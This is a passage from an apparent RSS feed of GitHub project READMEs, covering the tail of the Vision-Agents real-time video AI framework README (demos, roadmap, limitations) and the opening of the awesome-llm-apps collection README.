   &lt;td&gt;Wizper&lt;/td&gt; 
   &lt;td&gt;STT plugin with real-time translation capabilities powered by Whisper v3&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/wizper"&gt;Wizper&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;xAI&lt;/td&gt; 
   &lt;td&gt;LLM plugin using xAI's Grok models with advanced reasoning and real-time knowledge&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/xai"&gt;xAI&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Processors&lt;/h2&gt; 
&lt;p&gt;Processors let your agent &lt;strong&gt;manage state&lt;/strong&gt; and &lt;strong&gt;handle audio/video&lt;/strong&gt; in real-time.&lt;/p&gt; 
&lt;p&gt;They take care of the hard stuff, like:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Running smaller models&lt;/li&gt; 
 &lt;li&gt;Making API calls&lt;/li&gt; 
 &lt;li&gt;Transforming media&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;‚Ä¶ so you can focus on your agent logic.&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;Check out our getting started guide at &lt;a href="https://visionagents.ai/"&gt;VisionAgents.ai&lt;/a&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Quickstart:&lt;/strong&gt; &lt;a href="https://visionagents.ai/introduction/voice-agents"&gt;Building a Voice AI app&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Quickstart:&lt;/strong&gt; &lt;a href="https://visionagents.ai/introduction/video-agents"&gt;Building a Video AI app&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Tutorial:&lt;/strong&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/examples/01_simple_agent_example"&gt;Building a real-time meeting assistant&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Tutorial:&lt;/strong&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/examples/02_golf_coach_example"&gt;Building real-time sports coaching&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Examples&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;üîÆ Demo Applications&lt;/th&gt; 
   &lt;th&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;br /&gt;&lt;h3&gt;Cartesia&lt;/h3&gt;Using Cartesia's Sonic 3 model to visually look at what's in the frame and tell a story with emotion.&lt;br /&gt;&lt;br /&gt;‚Ä¢ Real-time visual understanding&lt;br /&gt;‚Ä¢ Emotional storytelling&lt;br /&gt;‚Ä¢ Frame-by-frame analysis&lt;br /&gt;&lt;br /&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/plugins/cartesia/example"&gt;&amp;gt;Source Code and tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/demo_gifs/cartesia.gif" width="320" alt="Cartesia Demo" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;br /&gt;&lt;h3&gt;Realtime Stable Diffusion&lt;/h3&gt;Realtime stable diffusion using Vision Agents and Decart's Mirage 2 model to create interactive scenes and stories.&lt;br /&gt;&lt;br /&gt;‚Ä¢ Real-time video restyling&lt;br /&gt;‚Ä¢ Interactive scene generation&lt;br /&gt;‚Ä¢ Stable diffusion integration&lt;br /&gt;&lt;br /&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/plugins/decart/example"&gt;&amp;gt;Source Code and tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/demo_gifs/mirage.gif" width="320" alt="Mirage Demo" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;br /&gt;&lt;h3&gt;Golf Coach&lt;/h3&gt;Using Gemini Live together with Vision Agents and Ultralytics YOLO, we're able to track the user's pose and provide realtime actionable feedback on their golf game.&lt;br /&gt;&lt;br /&gt;‚Ä¢ Real-time pose tracking&lt;br /&gt;‚Ä¢ Actionable coaching feedback&lt;br /&gt;‚Ä¢ YOLO pose detection&lt;br /&gt;‚Ä¢ Gemini Live integration&lt;br /&gt;&lt;br /&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/examples/02_golf_coach_example"&gt;&amp;gt;Source Code and tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/demo_gifs/golf.gif" width="320" alt="Golf Coach Demo" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;br /&gt;&lt;h3&gt;GeoGuesser&lt;/h3&gt;Together with OpenAI Realtime and Vision Agents, we can take GeoGuesser to the next level by asking it to identify places in our real world surroundings.&lt;br /&gt;&lt;br /&gt;‚Ä¢ Real-world location identification&lt;br /&gt;‚Ä¢ OpenAI Realtime integration&lt;br /&gt;‚Ä¢ Visual scene understanding&lt;br /&gt;&lt;br /&gt; &lt;a href="https://visionagents.ai/integrations/openai#openai-realtime"&gt;&amp;gt;Source Code and tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/demo_gifs/geoguesser.gif" width="320" alt="GeoGuesser Demo" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;br /&gt;&lt;h3&gt;Phone and RAG&lt;/h3&gt;Interact with your Agent over the phone using Twilio. This example demonstrates how to use TurboPuffer for Retrieval Augmented Generation (RAG) to give your agent specialized knowledge.&lt;br /&gt;&lt;br /&gt;‚Ä¢ Inbound/Outbound telephony&lt;br /&gt;‚Ä¢ Twilio Media Streams integration&lt;br /&gt;‚Ä¢ Vector search with TurboPuffer&lt;br /&gt;‚Ä¢ Retrieval Augmented Generation&lt;br /&gt;&lt;br /&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/examples/03_phone_and_rag_example"&gt;&amp;gt;Source Code and tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/demo_gifs/va_phone.png" width="320" alt="Phone and RAG Demo" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;br /&gt;&lt;h3&gt;Security Camera&lt;/h3&gt;A security camera with face recognition, package detection and automated theft response. Generates WANTED posters with Nano Banana and posts them to X when packages disappear.&lt;br /&gt;&lt;br /&gt;‚Ä¢ Face detection &amp;amp; named recognition&lt;br /&gt;‚Ä¢ YOLOv11 package detection&lt;br /&gt;‚Ä¢ Automated WANTED poster generation&lt;br /&gt;‚Ä¢ Real-time X posting&lt;br /&gt;&lt;br /&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/examples/04_security_camera_example"&gt;&amp;gt;Source Code and tutorial&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/demo_gifs/security_camera.gif" width="320" alt="Security Camera Demo" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/DEVELOPMENT.md"&gt;DEVELOPMENT.md&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Open Platform&lt;/h2&gt; 
&lt;p&gt;Want to add your platform or provider? Reach out to &lt;strong&gt;&lt;a href="mailto:nash@getstream.io"&gt;nash@getstream.io&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; 
&lt;h2&gt;Awesome Video AI&lt;/h2&gt; 
&lt;p&gt;Our favorite people &amp;amp; projects to follow for vision AI&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/demishassabis"&gt;&lt;img src="https://github.com/user-attachments/assets/9149e871-cfe8-4169-a4ce-4073417e645c" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/OfficialLoganK"&gt;&lt;img src="https://github.com/user-attachments/assets/2e1335d3-58af-4988-b879-1db8d862cd34" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/ultralytics"&gt;&lt;img src="https://github.com/user-attachments/assets/c9249ae9-e66a-4a70-9393-f6fe4ab5c0b0" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/demishassabis"&gt;@demishassabis&lt;/a&gt;&lt;br /&gt;CEO @ Google DeepMind&lt;br /&gt;&lt;sub&gt;Won a Nobel prize&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/OfficialLoganK"&gt;@OfficialLoganK&lt;/a&gt;&lt;br /&gt;Product Lead @ Gemini&lt;br /&gt;&lt;sub&gt;Posts about robotics vision&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/ultralytics"&gt;@ultralytics&lt;/a&gt;&lt;br /&gt;Various fast vision AI models&lt;br /&gt;&lt;sub&gt;Pose, detect, segment, classify&lt;/sub&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/skalskip92"&gt;&lt;img src="https://github.com/user-attachments/assets/c1fe873d-6f41-4155-9be1-afc287ca9ac7" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/moondreamai"&gt;&lt;img src="https://github.com/user-attachments/assets/43359165-c23d-4d5d-a5a6-1de58d71fabd" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/kwindla"&gt;&lt;img src="https://github.com/user-attachments/assets/490d349c-7152-4dfb-b705-04e57bb0a4ca" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/skalskip92"&gt;@skalskip92&lt;/a&gt;&lt;br /&gt;Open Source Lead @ Roboflow&lt;br /&gt;&lt;sub&gt;Building tools for vision AI&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/moondreamai"&gt;@moondreamai&lt;/a&gt;&lt;br /&gt;The tiny vision model that could&lt;br /&gt;&lt;sub&gt;Lightweight, fast, efficient&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/kwindla"&gt;@kwindla&lt;/a&gt;&lt;br /&gt;Pipecat / Daily&lt;br /&gt;&lt;sub&gt;Sharing AI and vision insights&lt;/sub&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/juberti"&gt;&lt;img src="https://github.com/user-attachments/assets/d7ade584-781f-4dac-95b8-1acc6db4a7c4" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/romainhuet"&gt;&lt;img src="https://github.com/user-attachments/assets/00a1ed37-3620-426d-b47d-07dd59c19b28" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/thorwebdev"&gt;&lt;img src="https://github.com/user-attachments/assets/eb5928c7-83b9-4aaa-854f-1d4f641426f2" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/juberti"&gt;@juberti&lt;/a&gt;&lt;br /&gt;Head of Realtime AI @ OpenAI&lt;br /&gt;&lt;sub&gt;Realtime AI systems&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/romainhuet"&gt;@romainhuet&lt;/a&gt;&lt;br /&gt;Head of DX @ OpenAI&lt;br /&gt;&lt;sub&gt;Developer tooling &amp;amp; APIs&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/thorwebdev"&gt;@thorwebdev&lt;/a&gt;&lt;br /&gt;Eleven Labs&lt;br /&gt;&lt;sub&gt;Voice and AI experiments&lt;/sub&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/mervenoyann"&gt;&lt;img src="https://github.com/user-attachments/assets/ab5ef918-7c97-4c6d-be10-2e2aeefec015" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/stash_pomichter"&gt;&lt;img src="https://github.com/user-attachments/assets/af936e13-22cf-4000-a35b-bfe30d44c320" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/Mentraglass"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1893061651152121856/Op4W8mza_400x400.jpg" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/mervenoyann"&gt;@mervenoyann&lt;/a&gt;&lt;br /&gt;Hugging Face&lt;br /&gt;&lt;sub&gt;Posts extensively about Video AI&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/stash_pomichter"&gt;@stash_pomichter&lt;/a&gt;&lt;br /&gt;Spatial memory for robots&lt;br /&gt;&lt;sub&gt;Robotics &amp;amp; AI navigation&lt;/sub&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/Mentraglass"&gt;@Mentraglass&lt;/a&gt;&lt;br /&gt;Open-source smart glasses&lt;br /&gt;&lt;sub&gt;Open-Source, hackable AR glasses with AI capabilities built in&lt;/sub&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;&lt;a href="https://x.com/vikhyatk"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1664559115581145088/UMD1vtMw_400x400.jpg" width="80" /&gt;&lt;/a&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://x.com/vikhyatk"&gt;@vikhyatk&lt;/a&gt;&lt;br /&gt;AI Engineer&lt;br /&gt;&lt;sub&gt;Open-source AI projects, Creator of Moondream AI&lt;/sub&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Inspiration&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Livekit Agents: Great syntax, Livekit only&lt;/li&gt; 
 &lt;li&gt;Pipecat: Flexible, but more verbose.&lt;/li&gt; 
 &lt;li&gt;OpenAI Agents: Focused on openAI only&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Roadmap&lt;/h2&gt; 
&lt;h3&gt;0.1 ‚Äì First Release - Oct&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Working TTS, Gemini &amp;amp; OpenAI&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;0.2 - Simplification - Nov&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Simplified the library &amp;amp; improved code quality&lt;/li&gt; 
 &lt;li&gt;Deepgram Nova 3, Elevenlabs Scribe 2, Fish, Moondream, QWen3, Smart turn, Vogent, Inworld, Heygen, AWS and more&lt;/li&gt; 
 &lt;li&gt;Improved openAI &amp;amp; Gemini realtime performance&lt;/li&gt; 
 &lt;li&gt;Audio &amp;amp; Video utilities&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;0.3 - Examples and Deploys - Jan&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Production-grade HTTP API for agent deployment (&lt;code&gt;uv run &amp;lt;agent.py&amp;gt; serve&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Metrics &amp;amp; Observability stack&lt;/li&gt; 
 &lt;li&gt;Phone/voice integration with RAG capabilities&lt;/li&gt; 
 &lt;li&gt;10 new LLM plugins (&lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/aws"&gt;AWS Nova 2&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/qwen"&gt;Qwen 3 Realtime&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/nvidia"&gt;NVIDIA Cosmos 2&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/pocket"&gt;Pocket TTS&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/deepgram"&gt;Deepgram TTS&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/openrouter"&gt;OpenRouter&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/huggingface"&gt;HuggingFace Inference&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/roboflow"&gt;Roboflow&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/twilio"&gt;Twilio&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/plugins/turbopuffer"&gt;Turbopuffer&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;Real-world examples (&lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/examples/05_security_camera_example"&gt;security camera&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/examples/03_phone_and_rag_example"&gt;phone integration&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/examples/04_football_commentator_example"&gt;football commentator&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/examples/07_deploy_example"&gt;Docker deployment with GPU support&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/examples/08_agent_server_example"&gt;agent server&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;Stability: Fixes for participant sync, video frame handling, agent lifecycle, and screen sharing&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;0.4 Documentation/polish&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Excellence on documentation/polish&lt;/li&gt; 
 &lt;li&gt;Better Roboflow annotation docs&lt;/li&gt; 
 &lt;li&gt;Automated workflows for maintenance&lt;/li&gt; 
 &lt;li&gt;Local camera/audio support AND/OR WebRTC connection&lt;/li&gt; 
 &lt;li&gt;Embedded/robotics examples&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Vision AI limitations&lt;/h2&gt; 
&lt;p&gt;Video AI is the frontier of AI. The state of the art is changing daily to help models understand live video. While building the integrations, here are the limitations we've noticed (Dec 2025)&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Video AI struggles with small text. If you want the AI to read the score in a game it will often get it wrong and hallucinate&lt;/li&gt; 
 &lt;li&gt;Longer videos can cause the AI to lose context. For instance if it's watching a soccer match it will get confused after 30 seconds&lt;/li&gt; 
 &lt;li&gt;Most applications require a combination of small specialized models like Yolo/Roboflow/Moondream, API calls to get more context and larger models like gemini/openAI&lt;/li&gt; 
 &lt;li&gt;Image size &amp;amp; FPS need to stay relatively low due to performance constraints&lt;/li&gt; 
 &lt;li&gt;Video doesn‚Äôt trigger responses in realtime models. You always need to send audio/text to trigger a response.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;We are hiring&lt;/h2&gt; 
&lt;p&gt;Join the team behind this project - we‚Äôre hiring a Staff Python Engineer to architect, build, and maintain a powerful toolkit for developers integrating voice and video AI into their products.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://jobs.ashbyhq.com/stream/3bea7dba-54e1-4c71-aa02-712a075842df?utm_source=Jmv9QOkznl"&gt;Apply here&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Star History&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://www.star-history.com/#GetStream/vision-agents&amp;amp;type=timeline&amp;amp;legend=top-left"&gt;&lt;img src="https://api.star-history.com/svg?repos=GetStream/vision-agents&amp;amp;type=timeline&amp;amp;legend=top-left" alt="Star History Chart" /&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Shubhamsaboo/awesome-llm-apps</title>
      <link>https://github.com/Shubhamsaboo/awesome-llm-apps</link>
      <description>&lt;p&gt;Collection of awesome LLM apps with AI Agents and RAG using OpenAI, Anthropic, Gemini and opensource models.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;a href="http://www.theunwindai.com"&gt; &lt;img src="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/docs/banner/unwind_black.png" width="900px" alt="Unwind AI" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://www.linkedin.com/in/shubhamsaboo/"&gt; &lt;img src="https://img.shields.io/badge/-Follow%20Shubham%20Saboo-blue?logo=linkedin&amp;amp;style=flat-square" alt="LinkedIn" /&gt; &lt;/a&gt; &lt;a href="https://twitter.com/Saboo_Shubham_"&gt; &lt;img src="https://img.shields.io/twitter/follow/Shubham_Saboo" alt="Twitter" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; 
 &lt;!-- Keep these links. Translations will automatically update with the README. --&gt; &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=de"&gt;Deutsch&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=es"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=fr"&gt;fran√ßais&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ja"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ko"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=pt"&gt;Portugu√™s&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ru"&gt;–†—É—Å—Å–∫–∏–π&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=zh"&gt;‰∏≠Êñá&lt;/a&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üåü Awesome LLM Apps&lt;/h1&gt; 
&lt;p&gt;A curated collection of &lt;strong&gt;Awesome LLM apps built with RAG, AI Agents, Multi-agent Teams, MCP, Voice Agents, and more.&lt;/strong&gt; This repository features LLM apps that use models from &lt;img src="https://cdn.simpleicons.org/openai" alt="openai logo" width="25" height="15" /&gt;&lt;strong&gt;OpenAI&lt;/strong&gt; , &lt;img src="https://cdn.simpleicons.org/anthropic" alt="anthropic logo" width="25" height="15" /&gt;&lt;strong&gt;Anthropic&lt;/strong&gt;, &lt;img src="https://cdn.simpleicons.org/googlegemini" alt="google logo" width="25" height="18" /&gt;&lt;strong&gt;Google&lt;/strong&gt;, &lt;img src="https://cdn.simpleicons.org/x" alt="X logo" width="25" height="15" /&gt;&lt;strong&gt;xAI&lt;/strong&gt; and open-source models like &lt;img src="https://cdn.simpleicons.org/alibabacloud" alt="alibaba logo" width="25" height="15" /&gt;&lt;strong&gt;Qwen&lt;/strong&gt; or &lt;img src="https://cdn.simpleicons.org/meta" alt="meta logo" width="25" height="15" /&gt;&lt;strong&gt;Llama&lt;/strong&gt; that you can run locally on your computer.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://trendshift.io/repositories/9876" target="_blank"&gt; &lt;img src="https://trendshift.io/api/badge/repositories/9876" alt="Shubhamsaboo%2Fawesome-llm-apps | Trendshift" style="width: 250px; height: 55px;" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h2&gt;ü§î Why Awesome LLM Apps?&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;üí° Discover practical and creative ways LLMs can be applied across different domains, from code repositories to email inboxes and more.&lt;/li&gt; 
 &lt;li&gt;üî• Explore apps that combine LLMs from OpenAI, Anthropic, Gemini, and open-source alternatives with AI Agents, Agent Teams, MCP &amp;amp; RAG.&lt;/li&gt; 
 &lt;li&gt;üéì Learn from well-documented projects and contribute to the growing open-source ecosystem of LLM-powered applications.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üôè Thanks to our sponsors&lt;/h2&gt; 
&lt;table align="center" cellpadding="16" cellspacing="12"&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt; &lt;a href="https://tsdb.co/shubham-gh" target="_blank" rel="noopener" title="Tiger Data"&gt; &lt;img src="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/docs/banner/sponsors/tigerdata.png" alt="Tiger Data" width="500" /&gt; &lt;/a&gt; &lt;br /&gt; &lt;a href="https://tsdb.co/shubham-gh" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;"&gt; Tiger Data MCP &lt;/a&gt; &lt;/td&gt; 
   &lt;td align="center"&gt; &lt;a href="https://github.com/speechmatics/speechmatics-academy" target="_blank" rel="noopener" title="Speechmatics"&gt; &lt;img src="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/docs/banner/sponsors/speechmatics.png" alt="Speechmatics" width="500" /&gt; &lt;/a&gt; &lt;br /&gt; &lt;a href="https://github.com/speechmatics/speechmatics-academy" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;"&gt; Speechmatics &lt;/a&gt; &lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt; &lt;a href="https://okara.ai/?utm_source=oss&amp;amp;utm_medium=sponsorship&amp;amp;utm_campaign=awesome-llm-apps" title="Okara"&gt; &lt;img src="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/docs/banner/sponsors/okara.png" alt="Okara" width="500" /&gt; &lt;/a&gt; &lt;br /&gt; &lt;a href="https://okara.ai/?utm_source=oss&amp;amp;utm_medium=sponsorship&amp;amp;utm_campaign=awesome-llm-apps" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;"&gt; Okara AI &lt;/a&gt; &lt;/td&gt; 
   &lt;td align="center"&gt; &lt;a href="https://sponsorunwindai.com/" title="Become a Sponsor"&gt; &lt;img src="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/docs/banner/sponsor_awesome_llm_apps.png" alt="Become a Sponsor" width="500" /&gt; &lt;/a&gt; &lt;br /&gt; &lt;a href="https://sponsorunwindai.com/" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;"&gt; Become a Sponsor &lt;/a&gt; &lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;üìÇ Featured AI Projects&lt;/h2&gt; 
&lt;h3&gt;AI Agents&lt;/h3&gt; 
&lt;h3&gt;üå± Starter AI Agents&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_blog_to_podcast_agent/"&gt;üéôÔ∏è AI Blog to Podcast Agent&lt;/a&gt;&lt;/li&gt; 
